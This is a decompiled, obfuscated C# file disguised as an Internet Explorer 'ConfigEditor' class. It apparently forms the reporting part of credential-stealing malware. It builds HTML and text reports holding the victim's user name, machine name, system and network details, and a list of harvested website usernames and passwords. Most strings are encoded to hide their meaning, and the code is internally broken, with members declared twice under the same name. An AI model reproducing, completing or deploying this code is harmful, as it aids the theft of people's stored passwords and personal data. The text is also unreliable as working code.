using System;
using System.Collections.Generic;
using System.Text;
using System.Text.RegularExpressions;

namespace iexprorer;

internal sealed class ConfigEditor
{
	public sealed class ActivatorEventArgs
	{
		private string valuesMap;

		private bool valuesMap;

		internal string ProcessPciture
		{
			get
			{
				return this.valuesMap;
			}
			set
			{
				this.valuesMap = value;
			}
		}

		internal bool ProcessPciture
		{
			get
			{
				return valuesMap;
			}
			set
			{
				valuesMap = value;
			}
		}
	}

	public static string ProcessPciture(ActivatorEventArgs activatorEventArgs_0)
	{
		StringBuilder stringBuilder_ = new StringBuilder();
		stringBuilder_.Append(_003CModule_003E.smethod_0("ä¼±®ø«¬¡\u00b4½åú¾·¶¬õ¾¹µ±\u00b4¡â\u008e½ª¼¹¶¹ôø\u009f½¶½®¹ôø«¹¶«õ«½ª±¾ãøº·ª¼½ªõ»·\u00b4·ªâû\u009b\u009b\u009bãøº·ª¼½ªõ\u00af±¼¬°â¬°±¶ãøº·ª¼½ªõ«¬¡\u00b4½â«·\u00b4±¼ãúæ", 216));
		stringBuilder_.Append(_003CModule_003E.smethod_0("ྌ࿔࿙\u0fc6\u0f90࿃࿄࿉\u0fdc࿕\u0f8d\u0f92࿖\u0fdf\u0fde࿄\u0f9d࿖࿑\u0fdd࿙\u0fdc࿉ྊ\u0fe6࿕࿂࿔࿑\u0fde࿑\u0f9c\u0f90\u0ff7࿕\u0fde࿕\u0fc6࿑\u0f9c\u0f90࿃࿑\u0fde࿃\u0f9d࿃࿕࿂࿙࿖ྋ\u0f90࿄࿕࿈࿄\u0f9d࿑\u0fdc࿙࿗\u0fdeྊ࿓࿕\u0fde࿄࿕࿂ྋ\u0f90࿖\u0fdf\u0fde࿄\u0f9d࿃࿙࿊࿕ྊ\u0f81\u0f86࿀࿈ྋ࿖\u0fdf\u0fde࿄\u0f9d࿇࿕࿙࿗࿘࿄ྊ྅\u0f80\u0f80ྋ\u0f90࿓\u0fdf\u0fdc\u0fdf࿂ྊ\u0f93\u0f86\u0f86\u0f86ྋ\u0f92\u0f8eྌ࿖\u0fdf\u0fde࿄\u0f90࿃࿙࿊࿕\u0f8d\u0f92\u0f9b\u0f86\u0f92\u0f8e\u0fe2࿙\u0fde\u0f90\u0ffc\u0fdf࿗࿗࿕࿂ྌ\u0f9f࿖\u0fdf\u0fde࿄\u0f8eྌ࿒࿂\u0f90\u0f9f\u0f8eྌ࿅\u0fdc\u0f8eྌ࿅\u0fdc\u0f8eྌ࿅\u0fdc\u0f8eྌ࿅\u0fdc\u0f8eྌ࿅\u0fdc\u0f8eྌ࿅\u0fdc\u0f8e࿋\u0f90\u0ff1࿅࿄࿅\u0fdd\u0fde\u0f90\u0ff5࿔࿙࿄࿙\u0fdf\u0fde\u0f90\u0fcdྌ\u0f9f࿅\u0fdc\u0f8eྌ\u0f9f࿅\u0fdc\u0f8eྌ\u0f9f࿅\u0fdc\u0f8eྌ\u0f9f࿅\u0fdc\u0f8eྌ\u0f9f࿅\u0fdc\u0f8eྌ\u0f9f࿅\u0fdc\u0f8eྌ\u0f9f࿔࿙\u0fc6\u0f8e", 4016));
		stringBuilder_.Append(string.Format(_003CModule_003E.smethod_0("\u0a45\u0a0cਕ\u0a47\u0a45ਝਐਏ\u0a47\u0a45ਟਖਗ\u0a0dਖ਼ਚਖਕਖ\u0a0b\u0a44ਜ਼ਗ਼\u0a4f\u0a4f\u0a4fਜ਼\u0a47ਵਖਞਞਜਝਖ਼ਸ਼ਗਖ਼\u0a02\u0a49\u0a04\u0a45\u0a56ਟਖਗ\u0a0d\u0a47\u0a45ਛ\u0a0bਖ਼\u0a56\u0a47\u0a45ਛ\u0a0bਖ਼\u0a56\u0a47\u0a45ਛ\u0a47ਬਊਜ\u0a0bਗਘਔਜ\u0a43\u0a45\u0a56ਛ\u0a47ਖ਼\u0a02\u0a48\u0a04\u0a45ਛ\u0a0bਖ਼\u0a56\u0a47\u0a45ਛ\u0a47\u0a34ਘਚ\u0a11ਐਗਜ\u0a43\u0a45\u0a56ਛ\u0a47ਖ਼\u0a02\u0a4b\u0a04\u0a45ਛ\u0a0bਖ਼\u0a56\u0a47\u0a45ਛ\u0a47\u0a3aਖ\u0a0cਗ\u0a0d\u0a0b\u0a00\u0a43\u0a45\u0a56ਛ\u0a47ਖ਼\u0a02\u0a4a\u0a04\u0a45ਛ\u0a0bਖ਼\u0a56\u0a47\u0a45ਛ\u0a47ਰ\u0a29ਖ਼ਸਝਝ\u0a0bਜਊਊ\u0a43\u0a45\u0a56ਛ\u0a47ਖ਼\u0a02\u0a4d\u0a04\u0a45ਛ\u0a0bਖ਼\u0a56\u0a47\u0a45ਛ\u0a0bਖ਼\u0a56\u0a47\u0a45ਛ\u0a0bਖ਼\u0a56\u0a47\u0a45ਛ\u0a47ਸ਼ਪਖ਼ਯਜ\u0a0bਊਐਖਗ\u0a43\u0a45\u0a56ਛ\u0a47ਖ਼\u0a02\u0a4c\u0a04ਖ਼\u0a51\u0a02\u0a4f\u0a04\u0a50\u0a45ਛ\u0a0bਖ਼\u0a56\u0a47\u0a45ਛ\u0a47ਸ਼ਪਖ਼ਫਸ\u0a34\u0a43\u0a45\u0a56ਛ\u0a47ਖ਼\u0a02\u0a4e\u0a04\u0a45ਛ\u0a0bਖ਼\u0a56\u0a47\u0a45ਛ\u0a47ਸ਼ਪਖ਼ਪਜ\u0a0bਐਘਕਖ਼\u0a37\u0a0cਔਛਜ\u0a0b\u0a43\u0a45\u0a56ਛ\u0a47ਖ਼\u0a02\u0a41\u0a04\u0a45ਛ\u0a0bਖ਼\u0a56\u0a47\u0a45ਛ\u0a0bਖ਼\u0a56\u0a47\u0a45ਛ\u0a0bਖ਼\u0a56\u0a47", 2681), Icon.UncheckNetwork(), Environment.UserName, Environment.MachineName, Icon.DeployMenuItem(), Icon.Print(), Icon.UnregisterPartition(), Icon.ResolveAssembly(), Icon.ProcessPciture().ToString().Remove(Icon.ProcessPciture().ToString().Length - 6) + _003CModule_003E.smethod_0("ẏỢử", 7855), Icon.BuildDrive()));
		if (activatorEventArgs_0.ProcessPciture)
		{
			stringBuilder_.Append(_003CModule_003E.smethod_0("ďőčžŜŉŚşşŒēŵŚŁŖŕŜŋďĜőč", 307));
			List<ConnectionLayout> list = ClientLayout.ProcessPciture();
			if (list.Count == 0)
			{
				stringBuilder_.Append(_003CModule_003E.smethod_0("ЄњъИЗІЄњъИЗІЄњІѶїіѝЄЗњІ", 1080));
			}
			else
			{
				ProcessPciture(ref stringBuilder_);
			}
		}
		Regex regex = new Regex(_003CModule_003E.smethod_0("ഩമഡജ\u0d01ങഐ൏ൕ൛എ\u0d45൙\u0d44\u0d45\u0d45ഈവ൛എ\u0d45൙\u0d46\u0d45ഈഩന", 3445));
		foreach (Match item in regex.Matches(activatorEventArgs_0.ProcessPciture))
		{
			activatorEventArgs_0.ProcessPciture = activatorEventArgs_0.ProcessPciture.Replace(item.ToString(), _003CModule_003E.smethod_0("ຝ໒໑ເ\u0ecfກ໒໕໘\u0ecdໄຜ\u0e83ໃເໂ\u0ecaໆ໓\u0ece໔\u0ecf\u0ec5ຌໂ\u0ece\u0ecd\u0ece໓ປຂຑ\u0ee2\u0ee7ບກໂ\u0ece\u0ecd\u0ece໓ປຂ\u0ee7\u0ee7\u0ee7ບກໃ\u0ece໓\u0ec5ໄ໓ຌໂ\u0ece\u0ecd\u0ece໓ປຂຑຑຑບກໃ\u0ece໓\u0ec5ໄ໓ຌ໒໕໘\u0ecdໄປ໒\u0ece\u0ecd\u0ec8\u0ec5ບກໃ\u0ece໓\u0ec5ໄ໓ຌ໖\u0ec8\u0ec5໕\u0ec9ປ໕\u0ec9\u0ec8\u0ecfບ\u0e83ຟ", 3745) + item.ToString() + _003CModule_003E.smethod_0("⍇⍔⌈⌋⌚⌕⍅", 9083));
		}
		Regex regex2 = new Regex(_003CModule_003E.smethod_0("မသ\u106b\u103e\u1074\u1069\u1074ၵ\u1038ၺမဘ", 4165));
		foreach (Match item2 in regex2.Matches(activatorEventArgs_0.ProcessPciture))
		{
			activatorEventArgs_0.ProcessPciture = activatorEventArgs_0.ProcessPciture.Replace(item2.ToString(), _003CModule_003E.smethod_0("ᄷᅸᅻᅪᅥᄫᅸᅿᅲᅧᅮᄶᄩᅩᅪᅨᅠᅬᅹᅤᅾᅥᅯᄦᅨᅤᅧᅤᅹᄱᄨᄻᅍᄲᄰᄫᅨᅤᅧᅤᅹᄱᄨᅍᅍᅍᄰᄩᄵ", 4363) + item2.ToString() + _003CModule_003E.smethod_0("\u0ac2\u0ad1ઍ\u0a8eટઐ\u0ac0", 2814));
		}
		activatorEventArgs_0.ProcessPciture = activatorEventArgs_0.ProcessPciture.Replace(Environment.NewLine, _003CModule_003E.smethod_0("ṍḓḃṑṞṏ", 7793));
		stringBuilder_.AppendLine(activatorEventArgs_0.ProcessPciture);
		stringBuilder_.Append(_003CModule_003E.smethod_0("\u0abfબ૧૪\u0af5ઽ\u0abfબ\u0af6૯ઽ", 2691));
		stringBuilder_.Append(_003CModule_003E.smethod_0("ƅƖǝǐǏƇ", 441));
		return stringBuilder_.ToString();
	}

	private static void ProcessPciture(ref StringBuilder stringBuilder_0)
	{
		foreach (ConnectionLayout item in ClientLayout.ProcessPciture())
		{
			stringBuilder_0.Append($"<br /><br /><b>Website:</b> {item.LoadDeployment}<br /><b>Username:</b> {item.ProcessPciture}<br /><b>Password:</b> {item.ResolveView}");
		}
	}

	public static string ResolveView(ActivatorEventArgs activatorEventArgs_0)
	{
		StringBuilder stringBuilder_ = new StringBuilder();
		stringBuilder_.AppendLine(_003CModule_003E.smethod_0("ᖞᖥᖢᗬᖀᖣᖫᖫᖩᖾᗬᖷᗬᖍᖹᖸᖹᖡᖢᗬᖉᖨᖥᖸᖥᖣᖢᗬᖱ", 5580));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("\u081f\u0859\u087a\u0872\u0872\u0870\u0871࠵\u085a\u087b࠵\u086e\u0825ࡨ", 2069), Icon.UncheckNetwork()));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("৹দঀখ\u0981ঝ\u0992ঞখ\u09c9\u09d3ঈ\u09c3\u098e", 2547), Environment.UserName));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("ᐨᐄᐆᐍᐌᐋ᐀ᑟᑅᐞᑕᐘ", 5221), Environment.MachineName));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("\u1b01ᬘ᭨ᬉᬬᬬ\u1b3aᬭ\u1b3b\u1b3b\u1b72᭨ᬳ᭸\u1b35", 6984), Icon.Print()));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("\u0acfઊખ\u0ae5ઓઠષશબપફ\u0aff\u0ae5\u0abe\u0af5સ\u0ae5૭\u0abe\u0af4સ૬", 2757), Icon.UnregisterPartition(), Icon.ResolveAssembly()));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("०ॺउॻ२।ओउ\u0952ङ\u0954उ\u0952घ\u0954", 2345), Icon.ProcessPciture().ToString().Remove(Icon.ProcessPciture().ToString().Length - 6), _003CModule_003E.smethod_0("ႸႷ\u1086", 4341)));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("ঈঔ১ঔঢ\u09b5মদফ১উলপথঢ\u09b5৽১\u09bc৷\u09ba", 2503), Icon.BuildDrive()));
		stringBuilder_.AppendLine();
		if (activatorEventArgs_0.ProcessPciture)
		{
			stringBuilder_.AppendLine(_003CModule_003E.smethod_0("ໝ\u0eff\u0eea\u0ef9\u0efc\u0efc\u0ef1ະ໖\u0ef9\u0ee2\u0ef5\u0ef6\u0eff\u0ee8", 3728));
			stringBuilder_.AppendLine();
			List<ConnectionLayout> list = ClientLayout.ProcessPciture();
			if (list.Count == 0)
			{
				stringBuilder_.AppendLine(_003CModule_003E.smethod_0("\u05bf\u059e\u059f\u0594", 1521));
			}
			else
			{
				ResolveView(ref stringBuilder_);
			}
		}
		stringBuilder_.AppendLine(activatorEventArgs_0.ProcessPciture);
		return stringBuilder_.ToString();
	}

	private static void ResolveView(ref StringBuilder stringBuilder_0)
	{
		foreach (ConnectionLayout item in ClientLayout.ProcessPciture())
		{
			stringBuilder_0.AppendLine(string.Format("Website: {0} {3}Username: {1} {3}Password:{2}", item.LoadDeployment, item.ProcessPciture, item.ResolveView, Environment.NewLine));
			stringBuilder_0.AppendLine();
		}
	}
}
